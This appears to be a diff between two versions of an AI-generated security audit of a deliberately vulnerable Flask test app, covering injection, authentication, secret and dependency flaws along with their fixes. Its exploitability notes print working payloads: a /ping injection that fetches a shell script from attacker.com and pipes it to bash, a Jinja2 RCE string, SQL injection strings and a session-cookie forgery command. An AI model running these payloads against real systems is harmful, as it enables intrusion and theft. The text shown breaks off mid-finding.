@@ -1,77 +1,96 @@
 # Security Investigation Report
 
 **Target:** `./test-app`
-**Date:** 2026-05-02
-**Agent:** Claude Security Investigator (TypeScript) v1.0
+**Date:** 2026-05-04
+**Agent:** Claude Security Investigator (TypeScript) v1.1
 **Files analyzed:** 3 (`app.py`, `requirements.txt`, `README.md`)
 
 ---
 
 ## Executive Summary
 
-This is a deliberately vulnerable Python/Flask application (136 lines of application code) containing **6 Critical** and **5 High** severity vulnerabilities. An unauthenticated attacker can achieve OS-level remote code execution via a single HTTP request to `/ping`, independently forge valid session cookies using the hardcoded `JWT_SECRET`, and delete every user record in the database — all without possessing any credentials. The codebase must **not** be deployed in any environment; it should be treated purely as a security-training target.
+This Flask 2.0.1 application is critically insecure across every attack surface examined. After merging and deduplicating findings from both audit subagents, 22 unique issues were identified: **9 Critical, 8 High, 3 Medium, 1 Low** (one finding — CVE-2020-25032 against flask-cors — was dropped as a false positive since 3.0.10 is later than the patched 3.0.9 release). Three independent, unauthenticated paths to full Remote Code Execution exist simultaneously: OS command injection in `/ping`, Jinja2 Server-Side Template Injection in `/render`, and the Werkzeug interactive debugger exposed on all network interfaces. Every admin endpoint is unauthenticated, both SQL query sites are injectable, all production secrets are hardcoded in source code, and every pinned dependency carries unpatched CVEs. This application must not be exposed to any network until all Critical findings are resolved.
 
 ---
 
 ## Critical Findings
 
-### [CRITICAL-1] OS Command Injection via `/ping` — Remote Code Execution
-
+### [CRITICAL-1] Command Injection in `/ping` — Unauthenticated RCE
+**ID:** CA-3
 **Location:** `app.py:107–109`
-**Description:** The `host` query parameter is interpolated directly into a shell command string and executed with `shell=True`. Any character sequence is passed verbatim to `/bin/sh`, giving an unauthenticated caller arbitrary OS-level code execution as the web-server process user.
+**Description:** The `host` GET parameter is interpolated directly into a shell command string and executed with `subprocess.run(..., shell=True)`. Any shell metacharacter causes the shell to interpret attacker-controlled code. No authentication, validation, or sandboxing is present.
 
 **Evidence:**
 ```python
+host = request.args.get("host", "localhost")
 result = subprocess.run(
     f"ping -c 1 {host}", shell=True, capture_output=True, text=True
 )
+return jsonify({"output": result.stdout, "error": result.stderr})
 ```
 
-**Exploitability:** `GET /ping?host=localhost%3B+curl+https%3A%2F%2Fattacker.com%2Fshell.sh+%7C+bash` runs a remote script on the server. No authentication is required. A single HTTP request gives an attacker a full reverse shell.
+**Exploitability:** Trivially reachable, zero prerequisites.
+- `GET /ping?host=localhost;id` — executes `id`, output in JSON response
+- `GET /ping?host=localhost;curl+http://attacker.com/shell.sh|bash` — drops a reverse shell
 
-**Remediation:** Eliminate `shell=True` entirely. Pass arguments as a list so the OS never invokes a shell interpreter. Validate `host` against a strict allowlist (IP or hostname regex) before use.
+**Remediation:** Pass arguments as a list with `shell=False`; validate host against an allowlist regex.
 
+**Suggested Fix:**
 ```python
 import re
-if not re.match(r'^[a-zA-Z0-9.\-]{1,253}$', host):
-    return jsonify({"error": "invalid host"}), 400
-result = subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True)
+
+SAFE_HOST_RE = re.compile(r'^[a-zA-Z0-9.\-]{1,253}$')
+
+@app.route("/ping")
+def ping():
+    host = request.args.get("host", "localhost")
+    if not SAFE_HOST_RE.match(host):
+        return jsonify({"error": "Invalid host"}), 400
+    result = subprocess.run(
+        ["ping", "-c", "1", host],   # shell=False — no shell expansion
+        capture_output=True, text=True, timeout=5
+    )
+    return jsonify({"output": result.stdout, "error": result.stderr})
 ```
 
 ---
 
-### [CRITICAL-2] Server-Side Template Injection (SSTI) via `/render` — Remote Code Execution
-
-**Location:** `app.py:117–118`
-**Description:** User input is concatenated into a Jinja2 template string before rendering. Jinja2 template expressions (`{{ }}`) embedded in the `name` parameter are evaluated by the template engine with full access to Python's object graph, enabling arbitrary code execution.
+### [CRITICAL-2] Server-Side Template Injection in `/render` — Unauthenticated RCE
+**ID:** CA-4
+**Location:** `app.py:115–118`
+**Description:** User input from the `name` GET parameter is concatenated into a Jinja2 template string, then processed by `render_template_string()`. Jinja2 executes `{{ ... }}` expressions embedded in the template source, including Python object-graph traversal chains that achieve full OS-level code execution. No authentication required.
 
 **Evidence:**
 ```python
+name = request.args.get("name", "world")
 template = "<h1>Hello, " + name + "!</h1>"
 return render_template_string(template)
 ```
 
 **Exploitability:**
-```
-GET /render?name={{config.items()}}
-```
-Leaks the entire Flask configuration including `SECRET_KEY`. Full RCE:
-```
-GET /render?name={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}
-```
-(The exact subclass index varies by Python version but is trivially enumerable.) No authentication required.
+- `GET /render?name={{config}}` → dumps `SECRET_KEY`, `API_KEY`, `DB_PASSWORD` from the Flask config dict
+- `GET /render?name={{''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()}}` → arbitrary OS command execution
 
-**Remediation:** Never concatenate user data into a template string. Pass user values as named variables so Jinja2 auto-escapes them:
+**Remediation:** Pass user data as a Jinja2 *variable*, never as part of the template string itself.
+
+**Suggested Fix:**
 ```python
-return render_template_string("<h1>Hello, {{ name }}!</h1>", name=name)
+from markupsafe import escape
+
+@app.route("/render")
+def render():
+    name = request.args.get("name", "world")
+    # name is a variable — not part of the template source — so Jinja2 cannot interpret it
+    return render_template_string("<h1>Hello, {{ name }}!</h1>", name=name)
 ```
+Jinja2 auto-escapes variables in HTML context; `escape()` is a belt-and-suspenders addition.
 
 ---
 
-### [CRITICAL-3] SQL Injection in `/login` — Authentication Bypass and Data Exfiltration
-
-**Location:** `app.py:58–64`
-**Description:** The `username` field from the JSON body is concatenated directly into a SQL `SELECT` statement. An attacker can inject SQL syntax to bypass the `username + password_hash` check entirely or execute arbitrary queries against the database.
+### [CRITICAL-3] SQL Injection in `/login` — Authentication Bypass
+**ID:** CA-1
+**Location:** `app.py:57–65`
+**Description:** The `username` field from the JSON body is concatenated directly into a SQL query string. An attacker injects SQL to short-circuit the `AND` clause and authenticate as any user — including admin — without knowing any valid password.
 
 **Evidence:**
 ```python
@@ -87,12 +106,14 @@ row = conn.execute(query).fetchone()
 
 **Exploitability:**
 ```
-POST /login
-{"username": "admin'--", "password": "anything"}
+POST /login   Content-Type: application/json
+{"username": "' OR '1'='1' --", "password": "anything"}
 ```
-The injected `'--` closes the string and comments out the password check; the query becomes `SELECT * FROM users WHERE username = 'admin'--'`. The admin row is returned and the caller is authenticated. UNION-based payloads can exfiltrate any table in the database.
+Returns the first user row (admin). Zero authentication required.
 
-**Remediation:** Use parameterized queries exclusively:
+**Remediation:** Use SQLite3 parameterized queries with `?` placeholders.
+
+**Suggested Fix:**
 ```python
 row = conn.execute(
     "SELECT * FROM users WHERE username = ? AND password_hash = ?",
@@ -102,10 +123,10 @@ row = conn.execute(
 
 ---
 
-### [CRITICAL-4] SQL Injection in `/search` — Full Database Dump
-
-**Location:** `app.py:78–80`
-**Description:** The `q` GET parameter is concatenated into a `LIKE` clause without escaping or parameterization. A UNION-based payload can pivot the query to return any column from any table, including `password_hash` for all users.
+### [CRITICAL-4] SQL Injection in `/search` — Full Database Exfiltration
+**ID:** CA-2
+**Location:** `app.py:77–81`
+**Description:** The `q` GET parameter is concatenated into a `LIKE` query without parameterization. A UNION-based injection exfiltrates any column from any table — password hashes, roles, all user data — without authentication.
 
 **Evidence:**
 ```python
@@ -116,24 +137,26 @@ rows = conn.execute(
 
 **Exploitability:**
 ```
-GET /search?q=x%' UNION SELECT password_hash,role FROM users WHERE '1'='1
+GET /search?q=%25' UNION SELECT password_hash,username FROM users WHERE '1'='1
 ```
-Returns all password hashes and roles for every user. Combined with the MD5 weakness (see HIGH-1), these hashes are trivially cracked.
+Dumps all password hashes in the JSON response. Combined with MD5 weakness (HIGH-1), plaintext passwords follow in seconds.
 
-**Remediation:**
+**Remediation:** Parameterize the LIKE query; construct `%` wildcards in Python before binding.
+
+**Suggested Fix:**
 ```python
 rows = conn.execute(
     "SELECT id, username FROM users WHERE username LIKE ?",
-    (f"%{term}%",)
+    ('%' + term + '%',)
 ).fetchall()
 ```
 
 ---
 
-### [CRITICAL-5] Missing Authentication on All `/admin/*` Endpoints
-
-**Location:** `app.py:86–100`
-**Description:** Both admin endpoints — listing all users and deleting any user by ID — have no authentication, session check, or authorization guard. Any HTTP client on the network can call them.
+### [CRITICAL-5] Missing Authentication on `/admin/users` — User Enumeration
+**ID:** CA-5
+**Location:** `app.py:85–91`
+**Description:** The admin user-list endpoint has no authentication, session check, or authorization guard. Any anonymous HTTP client enumerates every account including roles and numeric IDs.
 
 **Evidence:**
 ```python
@@ -141,103 +164,234 @@ rows = conn.execute(
 def admin_list_users():
     conn = get_db()
     rows = conn.execute("SELECT id, username, role FROM users").fetchall()
-    ...
+    conn.close()
+    return jsonify([dict(r) for r in rows])
+```
 
+**Exploitability:** `GET /admin/users` returns the full user database — IDs, usernames, roles — to any caller. Provides the target ID list needed to drive the unauthenticated delete endpoint.
+
+**Remediation:** Gate all `/admin/*` routes behind a `@require_admin` decorator that validates session state and `role == "admin"`.
+
+**Suggested Fix:**
+```python
+from functools import wraps
+from flask import session
+
+def require_admin(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        user_id = session.get("user_id")
+        if not user_id:
+            return jsonify({"error": "Authentication required"}), 401
+        conn = get_db()
+        row = conn.execute(
+            "SELECT role FROM users WHERE id = ?", (user_id,)
+        ).fetchone()
+        conn.close()
+        if not row or row["role"] != "admin":
+            return jsonify({"error": "Forbidden"}), 403
+        return f(*args, **kwargs)
+    return decorated
+
+@app.route("/admin/users")
+@require_admin
+def admin_list_users():
+    ...
+```
+Also update `/login` to write `session["user_id"] = row["id"]` on successful authentication.
+
+---
+
+### [CRITICAL-6] Missing Authentication on `/admin/delete/<id>` — Unauthenticated Account Deletion
+**ID:** CA-6
+**Location:** `app.py:93–100`
+**Description:** The user-deletion endpoint accepts a POST by integer ID with no authentication. Any unauthenticated caller can delete any user — including the admin account — in a single request.
+
+**Evidence:**
+```python
 @app.route("/admin/delete/<int:user_id>", methods=["POST"])
 def admin_delete_user(user_id):
     conn = get_db()
     conn.execute("DELETE FROM users WHERE id = ?", (user_id,))
+    conn.commit()
+    conn.close()
+    return jsonify({"status": "deleted", "id": user_id})
 ```
 
-**Exploitability:**
-```
-GET /admin/users        → full user enumeration, no credentials needed
-POST /admin/delete/1   → deletes the admin user, no credentials needed
-```
+**Exploitability:** `POST /admin/delete/1` deletes the admin account. Combined with CRITICAL-5, an attacker enumerates all IDs and wipes the entire user table in seconds. (Note: the `DELETE` itself correctly uses parameterized queries — the vulnerability is in the missing auth gate, not the query.)
 
-**Remediation:** Implement an `@require_admin` decorator that validates a session token or signed JWT before each request reaches these handlers. Reject unauthenticated requests with HTTP 401; reject non-admin sessions with HTTP 403.
+**Remediation:** Apply the `@require_admin` decorator from CRITICAL-5.
+
+**Suggested Fix:**
+```python
+@app.route("/admin/delete/<int:user_id>", methods=["POST"])
+@require_admin
+def admin_delete_user(user_id):
+    ...
+```
 
 ---
 
-### [CRITICAL-6] Hardcoded Secrets Committed to Source Code
-
-**Location:** `app.py:13–15, 20`
-**Description:** Three secrets are hardcoded in plaintext: a production API key, a database password, and a JWT secret. The JWT secret is also assigned as Flask's `SECRET_KEY`, which is used to cryptographically sign session cookies. Anyone with the secret can forge a valid session cookie for any user.
+### [CRITICAL-7] Hardcoded Production Secrets in Source Code
+**ID:** CA-9 / DC-11 (merged)
+**Location:** `app.py:13–15`
+**Description:** Three production secrets are hardcoded as string literals: a live production API key, a database password, and the session signing secret. Any person with repository access — developer, CI runner, attacker who exploits any path-disclosure vulnerability — immediately obtains all three.
 
 **Evidence:**
 ```python
-API_KEY = "sk-prod-7c4e9f2a1b8d3e6f5a9c0d4e8f1b2a7c"
+API_KEY    = "sk-prod-7c4e9f2a1b8d3e6f5a9c0d4e8f1b2a7c"
 DB_PASSWORD = "admin123"
+JWT_SECRET  = "supersecret"
+```
+
+**Exploitability:** The `JWT_SECRET` value is used directly as Flask's `SECRET_KEY` (line 20), enabling offline forging of admin session cookies (see CRITICAL-8). The `sk-prod-*` API key is a live credential that may grant access to downstream services and must be treated as compromised immediately.
+
+**Remediation:** Move all secrets to environment variables; rotate the API key now.
+
+**Suggested Fix:**
+```python
+import os, secrets as _secrets
+
+API_KEY     = os.environ["API_KEY"]              # hard fail if absent
+DB_PASSWORD = os.environ["DB_PASSWORD"]
+JWT_SECRET  = os.environ.get("SECRET_KEY") or _secrets.token_hex(32)
+```
+Add `python-dotenv` for local development; use your deployment platform's secrets manager in production. Add `.env` to `.gitignore` and commit a `.env.example` template.
+
+---
+
+### [CRITICAL-8] Hardcoded Flask `SECRET_KEY` — Session Cookie Forgery
+**ID:** CA-14 / DC-13 (merged)
+**Location:** `app.py:20`
+**Description:** `app.config["SECRET_KEY"]` is set to the hardcoded string `"supersecret"`. Flask uses this key to sign session cookies with `itsdangerous`. An attacker who knows this value (it is in the source code) can forge a valid session cookie for any user, including admin, without ever contacting the login endpoint.
+
+**Evidence:**
+```python
 JWT_SECRET = "supersecret"
-...
 app.config["SECRET_KEY"] = JWT_SECRET
 ```
 
-**Exploitability:** `JWT_SECRET = "supersecret"` is trivially guessable and is now in the codebase. An attacker who reads the source (via SSTI, directory traversal, or a leaked repository) can use `flask.sessions` or the `itsdangerous` library to forge a signed cookie claiming to be any user, including admin. The API key and DB password also leak access to external systems.
+**Exploitability:**
+```bash
+# Using flask-unsign (pip install flask-unsign):
+flask-unsign --sign --secret 'supersecret' \
+  --cookie '{"user_id": 1, "role": "admin"}'
+# Paste the resulting cookie into any request → instant admin session
+```
+This bypass survives all future auth patches until the key is rotated and externalized.
 
-**Remediation:** Remove all secrets from source. Load from environment variables or a secrets manager:
+**Remediation:** Generate a cryptographically random key from the environment.
+
+**Suggested Fix:**
+```python
+import os, secrets as _secrets
+app.config["SECRET_KEY"] = os.getenv("FLASK_SECRET_KEY") or _secrets.token_hex(32)
+```
+Set `FLASK_SECRET_KEY` to a securely generated 256-bit hex value in production. Rotate it immediately — treat all existing sessions as compromised.
+
+---
+
+### [CRITICAL-9] Flask Debug Mode Enabled + Bound to All Network Interfaces
+**ID:** CA-10 / DC-9 / CA-11 / DC-10 (merged)
+**Location:** `app.py:19`, `app.py:135`
+**Description:** `DEBUG=True` is hardcoded in two places and the server binds to `0.0.0.0:5000`. On any unhandled exception, Werkzeug exposes an interactive Python console accessible over the network. This is a third, independent path to full RCE beyond CRITICAL-1 and CRITICAL-2. The Werkzeug debugger PIN can be computed deterministically from `/proc/self/cgroup` and machine identifiers on Linux cloud instances.
+
+**Evidence:**
+```python
+app.config["DEBUG"] = True          # line 19
+app.run(host="0.0.0.0", port=5000, debug=True)   # line 135
+```
+
+**Exploitability:** Trigger any uncaught exception → access Werkzeug interactive console over the network → execute arbitrary Python as the web-server process. Exceptions are trivially induced (malformed JSON to `/login`, invalid route, deliberate injection).
+
+**Remediation:** Read `DEBUG` and host from environment variables; default to `False` / `127.0.0.1`. Use a WSGI server (Gunicorn, uWSGI) in production — never the Flask development server.
+
+**Suggested Fix:**
 ```python
 import os
-SECRET_KEY = os.environ["FLASK_SECRET_KEY"]   # fail fast if missing
-API_KEY    = os.environ["API_KEY"]
+app.config["DEBUG"] = os.getenv("FLASK_DEBUG", "false").lower() == "true"
+
+if __name__ == "__main__":
+    init_db()
+    app.run(
+        host=os.getenv("FLASK_HOST", "127.0.0.1"),
+        port=int(os.getenv("FLASK_PORT", "5000")),
+        debug=app.config["DEBUG"]
+    )
+# Production deployment:
+# gunicorn --bind 127.0.0.1:5000 --workers 4 app:app
 ```
-Rotate all three exposed credentials immediately. Add a `.gitignore`-backed `.env` file for local development; never commit it.
 
 ---
 
 ## High Findings
 
 ### [HIGH-1] Weak Password Hashing — Unsalted MD5
-
-**Location:** `app.py:54`; seeded hash at `app.py:41`
-**Description:** Passwords are hashed with MD5 — a general-purpose hash function that is cryptographically broken for this purpose. MD5 produces no salt, runs millions of iterations per second on consumer hardware, and has extensive precomputed rainbow tables available publicly. The `admin` user's hash (`0192023a7bbd73250516f069df18b500`) is recoverable from any MD5 rainbow table within seconds.
+**ID:** CA-7
+**Location:** `app.py:54`
+**Description:** All passwords are hashed with raw, unsalted MD5. MD5 produces billions of hashes per second on commodity GPUs; without a salt, every identical password produces the same hash and precomputed rainbow tables apply.
 
 **Evidence:**
 ```python
 password_hash = hashlib.md5(password.encode()).hexdigest()
 ```
-Seeded admin hash:
-```python
-VALUES ('admin', '0192023a7bbd73250516f069df18b500', 'admin');
-```
 
-**Exploitability:** An attacker who obtains hashes via the SQL injection in `/search` (CRITICAL-4) can crack all of them offline with `hashcat -m 0` at billions of attempts per second. The admin password (`admin123`) resolves in milliseconds.
+**Exploitability:** After dumping hashes via CRITICAL-4, submit them to any online MD5 rainbow table or run `hashcat -m 0` against a wordlist. The admin hash `0192023a7bbd73250516f069df18b500` is the MD5 of `admin123` and resolves instantly in any rainbow table lookup.
 
-**Remediation:** Use Werkzeug's built-in bcrypt wrapper (already a dependency):
+**Remediation:** Replace MD5 with `bcrypt` (or `werkzeug.security.generate_password_hash`).
+
+**Suggested Fix:**
 ```python
-from werkzeug.security import generate_password_hash, check_password_hash
-stored = generate_password_hash(password)          # bcrypt, salted
-valid  = check_password_hash(stored, password)
+# requirements.txt: add  bcrypt>=4.0.0
+import bcrypt
+
+def hash_password(pw: str) -> str:
+    return bcrypt.hashpw(pw.encode(), bcrypt.gensalt()).decode()
+
+def verify_password(pw: str, stored: str) -> bool:
+    return bcrypt.checkpw(pw.encode(), stored.encode())
+
+# In /login: compare against stored hash — don't query by hash value
+row = conn.execute(
+    "SELECT * FROM users WHERE username = ?", (username,)
+).fetchone()
+if row and verify_password(password, row["password_hash"]):
+    return jsonify({"status": "ok", "user": dict(row)})
+return jsonify({"status": "invalid"}), 401
 ```
-Migrate existing hashes on next successful login.
 
 ---
 
-### [HIGH-2] Permissive CORS — Wildcard Origin with Credentials
-
-**Location:** `app.py:21`
-**Description:** CORS is configured to accept requests from every origin while simultaneously allowing credentials. The [CORS specification](https://fetch.spec.whatwg.org/#cors-protocol-and-credentials) explicitly forbids this combination — browsers will refuse the response if they enforce the spec, but the server-side configuration still signals an intent to accept arbitrary cross-origin authenticated requests, and some clients (non-browsers, older browsers, or misconfigured proxies) will honor it.
+### [HIGH-2] Hardcoded Admin Password (MD5 of "admin123") in DB Seed
+**ID:** CA-8
+**Location:** `app.py:40–41`
+**Description:** `init_db()` seeds the admin account with the MD5 hash of `admin123` — a value present in every common rainbow table and immediately reversible. Any reader of the source code knows the admin password without cracking.
 
 **Evidence:**
 ```python
-CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)
+VALUES ('admin', '0192023a7bbd73250516f069df18b500', 'admin');
+-- MD5("admin123") = 0192023a7bbd73250516f069df18b500
 ```
 
-**Exploitability:** A malicious page on any domain can use `fetch("https://api.target.com/admin/users", {credentials: "include"})` and, in non-strict environments, read the response. Combined with the missing authentication on `/admin/*`, this is a CSRF/cross-origin data-theft vector.
+**Exploitability:** Low-severity in isolation (requires source access or a DB dump), but amplifies to Critical when chained with either SQL injection finding (HIGH-1 + CRITICAL-4 = instant full credential compromise).
 
-**Remediation:**
+**Remediation:** Derive the admin hash at startup from an environment variable using bcrypt.
+
+**Suggested Fix:**
 ```python
-CORS(app, resources={r"/api/*": {"origins": ["https://your-frontend.example.com"]}},
-     supports_credentials=True)
+admin_hash = hash_password(os.environ["ADMIN_PASSWORD"])
+conn.execute(
+    "INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?,?,?)",
+    ("admin", admin_hash, "admin")
+)
 ```
-Never combine `origins="*"` with `supports_credentials=True`.
 
 ---
 
-### [HIGH-3] Full Stack Traces Returned to HTTP Clients
-
+### [HIGH-3] Stack Traces Returned to HTTP Clients — Information Disclosure
+**ID:** CA-13
 **Location:** `app.py:121–129`
-**Description:** The global error handler serializes `traceback.format_exc()` into the JSON response body. Tracebacks expose internal file paths, library versions, variable names, and SQL error messages — all valuable for reconnaissance.
+**Description:** The global exception handler serializes the complete Python traceback into the HTTP response body. Every unhandled error leaks internal file paths, module names, SQL query fragments, library versions, and any secrets that appear in local variable scope at crash time.
 
 **Evidence:**
 ```python
@@ -250,197 +404,297 @@ def handle_error(e):
     )
 ```
 
-**Exploitability:** A deliberately malformed SQL injection payload that causes a parse error will return the full query string (including injected content) in the traceback, confirming the injection point and the DB schema. Attackers routinely use error-based enumeration to extract data.
+**Exploitability:** Reachable with no authentication. Sending malformed JSON to `/login`, an out-of-range ID to `/admin/delete`, or a deliberately broken SQL fragment induces a 500 that reveals the DB file path, query structure, and surrounding code. This materially assists all other attacks by mapping the application's internals.
 
-**Remediation:**
+**Remediation:** Log the traceback server-side; return a generic message to clients.
+
+**Suggested Fix:**
 ```python
-import logging, traceback
+import logging
 logger = logging.getLogger(__name__)
 
 @app.errorhandler(Exception)
 def handle_error(e):
-    logger.error("Unhandled exception: %s", traceback.format_exc())
-    return jsonify({"error": "Internal server error"}), 500
+    logger.exception("Unhandled exception")
+    return jsonify({"error": "An internal error occurred"}), 500
 ```
 
 ---
 
-### [HIGH-4] Flask Debug Mode Enabled
-
-**Location:** `app.py:19, 135`
-**Description:** `DEBUG = True` is set both in app config and in the `app.run()` call. Debug mode enables the Werkzeug interactive debugger (PIN-protected but known to be bypassable on some system configurations), hot code reloading, and verbose error pages. Even with the custom error handler overriding HTTP responses, the debug flag affects Flask's internal behavior and runtime exposure surface.
+### [HIGH-4] Permissive CORS — Wildcard Origin with `supports_credentials=True`
+**ID:** CA-12 / DC-12 (merged)
+**Location:** `app.py:21`
+**Description:** `flask-cors` is configured with `origins="*"` and `supports_credentials=True`. Rather than emitting `Access-Control-Allow-Origin: *` (which browsers reject alongside `Access-Control-Allow-Credentials: true`), flask-cors **reflects the incoming `Origin` header** when credentials are enabled — granting every domain credentialed CORS access.
 
 **Evidence:**
 ```python
-app.config["DEBUG"] = True
-...
-app.run(host="0.0.0.0", port=5000, debug=True)
+CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)
 ```
 
-**Exploitability:** If the custom exception handler fails (e.g., during request teardown or template rendering of the error itself), Werkzeug's debugger console can surface. On certain Linux configurations the debugger PIN is derivable from `/proc` filesystem data. Combined with `0.0.0.0` binding, this is network-reachable by any host.
+**Exploitability:** Once session-based auth is added (fixing CRITICAL-5/6), a malicious page on any domain can silently call credentialed endpoints in a victim's browser session — including administrative actions. The flask-cors CVEs (MEDIUM-1 through MEDIUM-3) make the origin-matching bypass possible even after switching to an explicit allowlist.
 
-**Remediation:** Never set `DEBUG = True` in production. Gate behind environment:
+**Remediation:** Replace wildcard with an explicit origin allowlist read from environment; optionally remove `supports_credentials` if cross-origin requests do not require cookies.
+
+**Suggested Fix:**
 ```python
-app.config["DEBUG"] = os.getenv("FLASK_ENV") == "development"
+allowed_origins = os.getenv("CORS_ORIGINS", "").split(",")
+CORS(app,
+     resources={r"/*": {"origins": [o.strip() for o in allowed_origins if o.strip()]}},
+     supports_credentials=True)
 ```
-Run production deployments behind Gunicorn or uWSGI — both disable the Werkzeug dev server entirely.
 
 ---
 
-### [HIGH-5] Significantly Outdated Dependencies
-
-**Location:** `requirements.txt:1–3`
-**Description:** The pinned versions (`Flask==2.0.1`, `Werkzeug==2.0.1`) are approximately two major versions behind the current stable release (Flask 3.x, Werkzeug 3.x). Multiple security patches — including fixes for multipart-data denial-of-service, cookie parsing bypasses, and path-handling issues — have been shipped in the intervening releases.
+### [HIGH-5] Flask 2.0.1 — CVE-2023-30861: Session Cookie Cache Poisoning
+**ID:** DC-1
+**Location:** `requirements.txt:1`
+**Description:** Flask before 2.3.2 does not emit a `Vary: Cookie` header on responses containing `Set-Cookie`. A caching reverse proxy in front of the application may cache such a response and serve one user's session cookie to a different user.
 
 **Evidence:**
 ```
 Flask==2.0.1
-flask-cors==3.0.10
+```
+
+**Exploitability:** Exploitable passively in deployments behind CDNs, nginx `proxy_cache`, or Varnish. No active attacker traffic is required; the proxy performs the cross-contamination automatically under normal load.
+
+**Remediation:** Upgrade Flask to ≥ 2.3.2.
+
+**Suggested Fix:**
+```
+# requirements.txt
+Flask>=2.3.2
+Werkzeug>=2.3.6   # compatible Werkzeug required alongside Flask 2.3.x
+```
+
+---
+
+### [HIGH-6] Werkzeug 2.0.1 — CVE-2023-25577: Multipart Form DoS
+**ID:** DC-6
+**Location:** `requirements.txt:3`
+**Description:** Werkzeug before 2.2.3 imposes no limit on the number of parts in a `multipart/form-data` request. A single crafted request with millions of parts exhausts CPU and memory across all worker processes, causing a denial of service.
+
+**Evidence:**
+```
 Werkzeug==2.0.1
 ```
 
-**Exploitability:** Werkzeug 2.0.x is affected by CVE-2022-29361 (improper cookie value encoding that can be exploited to bypass cookie-based authentication checks) and CVE-2023-25577 (ReDoS in multipart boundary parsing). An attacker can send a crafted multipart request to degrade the server into a DoS condition or bypass session validation.
+**Exploitability:** No authentication required. Any multipart-capable POST endpoint — including `/login` if its content-type is changed — can be targeted. A single request can hang a worker indefinitely.
 
-**Remediation:** Upgrade to current stable releases and pin with ranges:
+**Remediation:** Upgrade Werkzeug to ≥ 3.0.3 (also resolves CVE-2023-46136 and CVE-2023-23934). Add `MAX_CONTENT_LENGTH` as defence-in-depth.
+
+**Suggested Fix:**
 ```
-Flask>=3.0,<4
-Werkzeug>=3.0,<4
-flask-cors>=4.0,<5
+# requirements.txt
+Werkzeug>=3.0.3
 ```
-Add `pip-audit` or `safety` to the CI pipeline to catch newly disclosed CVEs automatically.
+```python
+app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024  # 16 MB hard cap
+```
+
+---
+
+### [HIGH-7] Missing Security Response Headers — XSS, Clickjacking, MitM
+**ID:** DC-14
+**Location:** `app.py` (no `after_request` hook present)
+**Description:** The application sets none of the standard browser security headers: no `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, or `Referrer-Policy`. Flask 2.0.1 does not add these by default.
+
+**Evidence:** No `after_request` handler and no `flask-talisman` configuration in `app.py`.
+
+**Exploitability:** Without CSP, any XSS payload (e.g. injected via SSTI or a future reflected-XSS vector) executes with full page privileges. Without `X-Frame-Options`, clickjacking attacks can overlay the app in an iframe. Without HSTS, traffic can be downgraded from HTTPS on a network-adjacent attacker.
+
+**Remediation:** Add an `after_request` hook or install `flask-talisman`.
+
+**Suggested Fix:**
+```python
+@app.after_request
+def set_security_headers(response):
+    response.headers["X-Content-Type-Options"] = "nosniff"
+    response.headers["X-Frame-Options"] = "DENY"
+    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
+    response.headers["Content-Security-Policy"] = "default-src 'self'; object-src 'none'"
+    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
+    return response
+```
+
+---
+
+### [HIGH-8] No Rate Limiting on `/login` — Brute-Force Attack Vector
+**ID:** DC-15
+**Location:** `app.py:48–70`
+**Description:** The `/login` endpoint accepts an unlimited number of requests per IP with no throttle, account lockout, or CAPTCHA. Combined with unsalted MD5 hashing, an attacker can also verify cracked hashes directly online with no risk of detection or blocking.
+
+**Evidence:**
+```python
+@app.route("/login", methods=["POST"])
+def login():
+    # No rate limiting, no account lockout
+```
+
+**Exploitability:** Automated credential stuffing or password spraying has zero friction. When chained with CRITICAL-3 (SQL injection auth bypass), brute force is entirely unnecessary — but the endpoint is also vulnerable to it independently.
+
+**Remediation:** Apply per-IP rate limiting with `flask-limiter`.
+
+**Suggested Fix:**
+```python
+# requirements.txt: add flask-limiter>=3.0.0
+from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
+
+limiter = Limiter(app=app, key_func=get_remote_address,
+                  default_limits=["200 per day", "50 per hour"])
+
+@app.route("/login", methods=["POST"])
+@limiter.limit("5 per minute")
+def login():
+    ...
+```
+In production, back the limiter with Redis (`storage_uri="redis://..."`) so limits are shared across all workers.
 
 ---
 
 ## Medium Findings
 
-### [MEDIUM-1] Application Binds to All Network Interfaces (`0.0.0.0`)
+### [MEDIUM-1] flask-cors 3.0.10 — CVE-2024-6221: Private Network Access Exposure
+**ID:** DC-3
+**Location:** `requirements.txt:2`
+**Description:** flask-cors ≤4.0.1 sets `Access-Control-Allow-Private-Network: true` by default. This allows public web pages to make browser-mediated cross-origin requests into the private network where this Flask app runs.
 
-**Location:** `app.py:135`
-**Description:** The Flask development server listens on `0.0.0.0`, making the application reachable from any network interface — including public-facing adapters in cloud or shared-hosting environments. The development server is not designed to handle production traffic safely.
+**Evidence:** `flask-cors==3.0.10`
 
-**Evidence:**
-```python
-app.run(host="0.0.0.0", port=5000, debug=True)
-```
+**Exploitability:** An attacker's public website instructs a victim's browser to probe the internal network via the Private Network Access protocol. Internal services become reachable without any special network position.
 
-**Exploitability:** In a cloud VM with a public IP, every vulnerability in this report is immediately reachable from the internet without firewall rules specifically blocking port 5000.
-
-**Remediation:** For development, bind to `127.0.0.1`. For production, run behind Gunicorn (`gunicorn -w 4 app:app`) behind an Nginx reverse proxy that terminates TLS; never expose the Flask dev server publicly.
+**Remediation:** Upgrade flask-cors to ≥ 5.0.2.
 
 ---
 
-### [MEDIUM-2] No Rate Limiting on Authentication Endpoint
+### [MEDIUM-2] flask-cors 3.0.10 — CVE-2024-6839: Regex Priority Confusion
+**ID:** DC-4
+**Location:** `requirements.txt:2`
+**Description:** flask-cors ≤5.0.1 prioritizes longer regex patterns over more specific ones, causing less restrictive CORS policies to be applied to sensitive endpoints when multiple resource patterns are configured.
 
-**Location:** `app.py:48–70` (absence of limiting middleware)
-**Description:** The `/login` endpoint has no rate limiting, account lockout, or CAPTCHA mechanism. Combined with the trivially brute-forceable MD5 password hashing (HIGH-1), an attacker can make unlimited login attempts at the speed of the server's response time.
